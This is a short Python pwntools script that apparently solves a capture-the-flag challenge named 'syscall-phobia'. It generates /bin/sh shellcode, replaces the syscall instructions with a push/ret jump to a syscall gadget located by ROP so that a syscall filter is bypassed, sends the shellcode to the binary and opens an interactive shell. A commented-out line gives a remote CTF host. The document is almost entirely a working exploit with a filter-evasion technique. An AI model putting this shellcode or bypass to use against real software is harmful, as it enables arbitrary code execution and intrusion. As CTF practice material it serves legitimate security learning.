#!/usr/bin/env python3

from pwn import *

binary_path = './challenge/syscall-phobia'
context.binary = binary_path

e = ELF(binary_path)
e.checksec()

r = ROP(e)
assembly = shellcraft.sh()
assembly = assembly.replace("syscall", f"push {hex(r.syscall.address)}\n    ret")
print(assembly)

shellcode = asm(assembly)
print(shellcode.hex())
# 6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b58685e0d4000c3

r = process(binary_path)
# r = remote(c'tf-85ib.balancedcompo.site', 9998)

r.read()
r.sendline(shellcode.hex())
r.interactive()